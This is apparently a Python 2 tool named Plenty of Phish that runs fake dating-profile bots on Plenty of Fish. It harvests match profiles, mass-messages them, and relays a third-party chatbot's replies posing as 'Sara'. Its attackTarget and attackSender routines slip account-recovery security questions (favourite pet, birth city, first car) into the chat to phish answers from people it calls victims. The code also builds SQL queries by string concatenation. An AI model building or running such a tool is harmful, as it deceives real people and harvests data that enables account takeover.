
#!/usr/bin/python

## Import Libaries
import time
import cmd
import os
import sqlite3 as db
import getpass
import mechanize
import re

## Import Functions from Libraries
from random import randint
from random import shuffle
from progressbar import ProgressBar
from bs4 import BeautifulSoup
from cosmetic.splash import *
from OkStupid.OkStupid import *
from Plenty_of_Phish.PlentyofPhish import *

## Define Global Variables
global db_name
global current_okc
global current_pof
global okc_username
global okc_passwd
global pof_username
global pof_passwd
global oks
db_name = 'db/bots.db'
current_pof = "[No Bot Activated]"
target_pof = "[No Target Defined]"

## Questions
recovery_array = [
    "What was the name of your favorite pet?",
    "What is your favorite actor?",
    "What city were you born in?",
    "What high school did you attend?",
    "What is your favorite movie?",
    "What was the street you grew up on?",
    "What is your favorite color?",
    "What was your first car?",
    "What was your high school mascot?",
]
shuffle(recovery_array)

## Attack Bot Paramaters
bot_name = "Sara"
college_name = "SF State University"
state_name = "California"
age = "32"

## Configure Browsers
oks = mechanize.Browser()
oks.set_handle_robots(False)
oks.set_handle_refresh(False)

class BotController(cmd.Cmd):

    def do_addBot(self,null):
        "\nAdds a new Plenty of Fish bot to the database.\n\n"
        global current_pof
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        print "[+] Database Connection Succeeded\n\n"
        username = raw_input("Enter Username for bot: ")
        print "\nEnter Password for " + username + ":\n"
        passwd = getpass.getpass()
        print "\nOne more time to Confirm...\n"
        passwd2 = getpass.getpass()
        if passwd == passwd2:
            try:
                cur.execute("INSERT INTO POF_Bots VALUES('"+username+"','"+passwd+"');")
                cur.execute("CREATE TABLE POF_"+username+"_matches(match_id TEXT, username TEXT, location TEXT, age TEXT, gender TEXT, height TEXT, religion TEXT, ethnicity TEXT, sign TEXT, education TEXT, personality TEXT, profession TEXT, seeking TEXT, agenda TEXT, drinks TEXT, marital TEXT, drugs TEXT, hair TEXT, eyes TEXT, car TEXT, children TEXT, longest_rel TEXT)")
                cur.execute("CREATE TABLE POF_"+username+"_messages(match_id TEXT, dateTime DATETIME, contents TEXT)")
                con.commit()
                con.close()
            except:
                print "\n\n[-] ERROR! Something broke while adding bot to database"
                return
        else:
            print "\n\n[-] FAILED! Passwords did not Match...Try again..."
            return
        print "\n\n[+] SUCCESS! Bot added to database\n\n"
        status(current_pof,target_pof)

    def do_listBots(self,null):
        "\nLists Plenty of Fish Bots in Database\n\n"
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT username from POF_Bots")
            raw_index = []
            for value in raw_response:
                raw_index.append(str(value))
            print "[+] Current POF Users in Database:\n\n"
            for string in raw_index:
                print string.split("'")[1]
            print "\n\n"
        except:
            print "\n\n[-] ERROR! Something went wrong getting bots"
            return
        status(current_pof,target_pof)

    def do_deleteBot(self,null):
        "\nDelete a Plenty of Phish Bot from the Database\n\n"
        global pof_username
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT username from POF_Bots")
            raw_index = []
            for value in raw_response:
                raw_index.append(str(value))
            print "[+] Current POF Users in Database:\n\n"
            i = 1
            for string in raw_index:
                print str(i) + ' - ' + string.split("'")[1]
                i = i + 1
            print "\n\n"
        except:
            print "\n\n[-] ERROR! Something went wrong getting bots"
            return
        try:
            botId = int(raw_input("Enter the Bot Number to Delete: "))
            raw_index = []
            raw_response = cur.execute("SELECT * from POF_Bots")
            for value in raw_response:
                raw_index.append(str(value))
            global pof_passwd
            pof_passwd = ''
            global pof_username
            pof_username = raw_index[(int(botId)-1)].split("'")[1]
            global current_pof
            current_pof = '[No Bot Activated]'
            cur.execute("DROP TABLE POF_"+pof_username+"_matches")
            cur.execute("DROP TABLE POF_"+pof_username+"_messages")
            cur.execute("DELETE from POF_Bots WHERE username = '"+pof_username+"'")
            pof_username = ''
            con.commit()
            con.close()
        except:
            print "\n\n[-] ERROR! Something went wrong deleting bot"
            return
        print "\n\n[+] SUCCESS! Bot " + pof_username + " has been deleted...\n\n"
        status(current_pof,target_pof)
        

    def do_useBot(self,null):
        "\nActivates a Plenty of Fish Bot from the Database\n\n"
        global pof_username
        global pof_passwd
        global current_pof
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT username from POF_Bots")
            raw_index = []
            for value in raw_response:
                raw_index.append(str(value))
            print "[+] Current POF Users in Database:\n\n"
            i = 1
            for string in raw_index:
                print str(i) + ' - ' + string.split("'")[1]
                i = i + 1
            print "\n\n"
        except:
            print "\n\n[-] ERROR! Something went wrong getting bots"
            return
        try:
            botId = int(raw_input("Enter the Bot Number to Activate: "))
            raw_index = []
            raw_response = cur.execute("SELECT * from POF_Bots")
            for value in raw_response:
                raw_index.append(str(value))
            pof_passwd = raw_index[(int(botId)-1)].split("'")[3]
            pof_username = raw_index[(int(botId)-1)].split("'")[1]
            current_pof = pof_username
        except:
            print "\n\n[-] ERROR! Something went wrong activating bot"
            return
        print "\n\n[+] SUCCESS! Bot " + pof_username + " is now Activated...\n\n"
        status(current_pof,target_pof)


    def do_defineTarget(self,null):
        "\nAdds POF Target by User ID\n\n"
        global target_pof
        target_pof = str(raw_input("Enter Target User ID (as displayed in profile URL): "))
        print "\n\n[+] SUCCESS! Activated Target\n\n"
        status(current_pof,target_pof)

    def do_targetInfo(self,null):
        "\nGathers Profile Details of Currently Defined Target\n\n"
        global target_pof
        target_details = response_soup_scrape(target_pof)
        for detail in target_details:
            print detail
        ## Update how displayed
        print "\n\n[+] SUCCESS! Target Details Scraped and Returned\n\n"
        status(current_pof,target_pof)

    def do_harvestMatches(self,null):
        "\nHarvests Plenty of Fish Bot Matches. Must have POF Bot Activated.\n\n"
        try:
            login = False
            total = int(raw_input("How many Matches to Harvest? - "))
            oks.open("http://www.pof.com")
            for link in oks.links():
                if 'Log Out' in link.text:
                    login = True
                else:
                    pass
            if login:
                print "\n\n[+] Already Logged in...\n\n"
            else:
                login = pof_login(oks, pof_username, pof_passwd)
                if login:
                    print "\n\n[+] Login was Successful...\n\n"
                else:
                    print "\n\n[-] Login Failed...\n\n"
            past_matches = pof_past_matches(db_name,pof_username)
            length = len(past_matches)
            print "[+] There are currently " + str(length) + " matches associated with this bot...\n\n"
            pbar = ProgressBar(maxval=total).start()
            i = 1
            while length < total:
                past_matches = pof_past_matches(db_name,pof_username)
                i = pof_harvest_match_ids(oks, db_name, pof_username, i)
                length = len(past_matches)
                pbar.update(length)
            pbar.finish()
            print "\n\n[+] SUCCESS!!! " + str(length) + " Matches Enumerated...\n\n"
        except:
            print "\n\n[-] ERROR! Something broke while harvesting Matches\n\n"
            return
        status(current_pof,target_pof)

    def do_listMatches(self,null):
        "\nLists Enumerated Plenty of Fish Matches for the Activated Bot\n\n"
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT * FROM POF_"+current_pof+"_matches")
            raw_index = []
            for value in raw_response:
                raw_index.append(str(value))
            print "[+] Current Enumerated Matches for Activated POF Bot:\n\n"
            for string in raw_index:
                print string.replace("u''"," ").replace("u'"," ")
            print "\n\n"
        except:
            print "\n\n[-] ERROR! Something went wrong getting bots"
            return
        status(current_pof,target_pof)

    def do_favoriteMatches(self,null):
        "\nBrowses to and Favorites all Harvested Plenty of Fish Matches for Activated Bot\n\n"
        print "\n[+] Accessing: " + str(db_name) + "\n\n"
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT * FROM POF_"+current_pof+"_matches")
            raw_index = []
            matches = []
            for value in raw_response:
                raw_index.append(str(value))
            for string in raw_index:
                matches.append(string.split("'")[1])
            for match in matches:
                try:
                    oks.open("http://www.pof.com/viewprofile.aspx?profile_id=" + str(match))
                    oks.follow_link(text="Add to Favorites!")
                    print "[+] Profile Favorited - http://www.pof.com/viewprofile.aspx?profile_id=" + str(match) + "\n"
                except:
                    print "[-] Error Occured - http://www.pof.com/viewprofile.aspx?profile_id=" + str(match) + "\n"
            print "\n\n"
        except:
            print "\n\n[-] ERROR! Something went wrong favoriting Matches"
            return
        status(current_pof,target_pof)

    def do_messageMatches(self,null):
        "\nSend message to all Harvested Plenty of Fish Matches for Activated Bot\n\n"
        print "\n[+] Accessing: " + str(db_name) + "\n\n"

        ## Logging in with PoF Browser
        oks.open("http://www.pof.com")
        login = pof_login(oks, pof_username, pof_passwd)
        if login:
            print "\n\n[+] Login was Successful..."
        else:
            print "\n\n[-] Login Failed...\n\n"

        ## Database Connection
        try:
            con = db.connect(db_name)
            cur = con.cursor()
        except:
            print "[-] ERROR! Failed to Connect to Database\n\n"
            return
        try:
            raw_response = cur.execute("SELECT * FROM POF_"+current_pof+"_matches")
            raw_index = []
            matches = []
            for value in raw_response:
                raw_index.append(str(value))
            for string in raw_index:
                matches.append(string.split("'")[1])
            for match in matches:
                try:
                    ## Identify Target Username
                    response = oks.open("http://www.pof.com/viewprofile.aspx?profile_id="+match)
                    soup = BeautifulSoup(response.read())
                    target_user = (str(soup.find_all("div", attrs={'class':'username-bar'}))).split('>')[1].split(':')[0]
                    print "\n\n[+] Identified target username as " + target_user

                    ## Send Initial Message
                    oks.form = list(oks.forms())[1]
                    control = oks.form.find_control("message")
                    control.value = "hey there ;)"
                    oks.submit()
                    print "\n\n[+] Initial contact has been made..."
                except:
                    print "[-] Error Occured - " + str(match)
        except:
            print "\n\n[-] ERROR! Something went wrong sending messages"
            return
        status(current_pof,target_pof)

    def do_attackTarget(self,null):
        "\nInitiate conversation between activated bot and target"
        print "\n\n[+] Initiating conversation between bot ("+current_pof+") and target (userid "+target_pof+")"

        ## Initialize Attack Bot Browser
        abot = mechanize.Browser()
        abot.set_handle_robots(False)
        abot.set_handle_refresh(False)
        abot.open("http://www.personalityforge.com/directchat.php?BotID=48646&MID=37471")
        abot.form = list(abot.forms())[0]

        ## Logging in with PoF Browser
        oks.open("http://www.pof.com")
        login = pof_login(oks, pof_username, pof_passwd)
        if login:
            print "\n\n[+] Login was Successful..."
        else:
            print "\n\n[-] Login Failed...\n\n"

        ## Identify Target Username
        response = oks.open("http://www.pof.com/viewprofile.aspx?profile_id="+target_pof)
        soup = BeautifulSoup(response.read())
        target_user = (str(soup.find_all("div", attrs={'class':'username-bar'}))).split('>')[1].split(':')[0]
        print "\n\n[+] Identified target username as " + target_user

        ## Send Initial Message
        oks.form = list(oks.forms())[1]
        control = oks.form.find_control("message")
        control.value = "hey there ;)"
        oks.submit()
        print "\n\n[+] Initial contact has been made..."
        print "\n\n[+] Initial message from bot - \033[1;31mhey there ;)\033[1;m"
        x = 1
        while x < 20:
            print "\n\n[+] Awaiting reply...this could take a while..."
            time.sleep(randint(60,120)) 
            oks.follow_link(url="/inbox.aspx")
            msg_link = ''
            for link in oks.links():
                if target_user+' ' in link.text:
                    msg_link = link.url
            if msg_link == '':
                pass
            else:
                response = oks.follow_link(url=msg_link)    
                soup = BeautifulSoup(response.read())
                divs = soup.find_all("div", attrs={'class':'message-content'})
                if "usersendto" in str(divs[(len(divs)-1)]):
                    victim_reply = str(divs[(len(divs)-1)]).split('>')[1].split('<')[0]
                    print "\n\n[+] Response detected..."
                    print "\n\n[+] Victim reply - \033[1;34m" + victim_reply + "\033[1;m"
                    abot["Message"] = str(victim_reply)
                    abot_response = abot.submit()
                    abot_soup = BeautifulSoup(abot_response.read())
                    abot_divs = abot_soup.find_all("div", attrs={'class':'theMessage bigfont'})
                    abot_reply = re.sub('<([^>]*)>','',str(abot_divs)).replace('\\t','').replace('\\r','').replace('[','').replace(']','').split('\\n')[2]
                    sanitized_reply = re.sub('Guest\d+','cutie',(abot_reply.replace('Amanda',bot_name).replace('UCLA',college_name).replace('California',state_name).replace('22',age)))
                    if x == 5:
                        sanitized_reply = question_01
                    if x == 10:
                        sanitized_reply = question_02
                    if x == 15:
                        sanitized_reply = question_03
                    oks.select_form("sendmessage")
                    control = oks.form.find_control("message")
                    control.value = sanitized_reply
                    oks.submit()
                    print "\n\n[+] Bot reply - \033[1;31m" + sanitized_reply + "\033[1;m"
                    abot.form = list(abot.forms())[0]
                    x = x + 1
        print "\n\n[+] ATTACK COMPLETE"
        return

    def do_attackSender(self,null):
        "\nInitiate conversation between activated bot and sender of last message recieved"
        ## Initialize Attack Bot Browser
        abot = mechanize.Browser()
        abot.set_handle_robots(False)
        abot.set_handle_refresh(False)
        abot.open("http://www.personalityforge.com/directchat.php?BotID=48646&MID=37471")
        abot.form = list(abot.forms())[0]

        ## Logging in with PoF Browser
        oks.open("http://www.pof.com")
        login = pof_login(oks, pof_username, pof_passwd)
        #if login:
        print "\n\n[+] Login was Successful..."
        #else:
        #    print "\n\n[-] Login Failed...\n\n"

        ## Identify Last Sender
        print "\n\n[+] Opening inbox to identify last sender..."
        oks.follow_link(url="/inbox.aspx")
        front_page = []
        for link in oks.links():
            if "viewallmessages.aspx?sender_id=" in link.url:
                front_page.append(link.url)
        last_message = front_page[0]
        response = oks.follow_link(url=last_message)
        soup = BeautifulSoup(response.read(),"lxml")

        ## Identify Target Username
        spans = soup.find_all("span", attrs={'class':'headline'})
        target_user = str(spans[1]).split('>')[1].replace('Your conversation with ','').split('<')[0]
        print "\n\n[+] Identified target username as " + target_user

        ## Send Initial Message
        x = 1
        while recovery_array:
            oks.follow_link(url="/inbox.aspx")
            msg_link = ''
            for link in oks.links():
                if target_user+' ' in link.text:
                    msg_link = link.url
            if msg_link == '':
                pass
            else:
                response = oks.follow_link(url=msg_link)
                soup = BeautifulSoup(response.read(),"lxml")
                divs = soup.find_all("div", attrs={'class':'message-content'})
                if "usersendto" in str(divs[(len(divs)-1)]):
                    victim_reply = str(divs[(len(divs)-1)]).split('>')[1].split('<')[0]
                    print "\n\n[+] Response detected..."
                    print "\n\n[+] Victim reply - \033[1;34m" + victim_reply + "\033[1;m"
                    abot["Message"] = str(victim_reply)
                    abot_response = abot.submit()
                    abot_soup = BeautifulSoup(abot_response.read(),"lxml")
                    abot_divs = abot_soup.find_all("div", attrs={'class':'theMessage bigfont'})
                    abot_reply = re.sub('<([^>]*)>','',str(abot_divs)).replace('\\t','').replace('\\r','').replace('[','').replace(']','').split('\\n')[2]
                    sanitized_reply = re.sub('Guest\d+','cutie',(abot_reply.replace('Amanda',bot_name).replace('UCLA',college_name).replace('California',state_name).replace('22',age)))
                    if x%5 == 0:
                        sanitized_reply = recovery_array[0]
                        recovery_array.remove(recovery_array[0])
                    oks.select_form("sendmessage")
                    control = oks.form.find_control("message")
                    control.value = sanitized_reply
                    oks.submit()
                    print "\n\n[+] Bot reply - \033[1;31m" + sanitized_reply + "\033[1;m"
                    abot.form = list(abot.forms())[0]
                    x = x + 1
            print "\n\n[+] Awaiting reply...this could take a while..."
            time.sleep(randint(30,90))

        print "\n\n[+] ATTACK COMPLETE"
        return

    def do_exit(self,null):
        "\nExit Bot Controller Interface\n\n"
        return True



robots()
status(current_pof,target_pof)
BotController.prompt = "(POF_BotController) "
BotController().cmdloop()

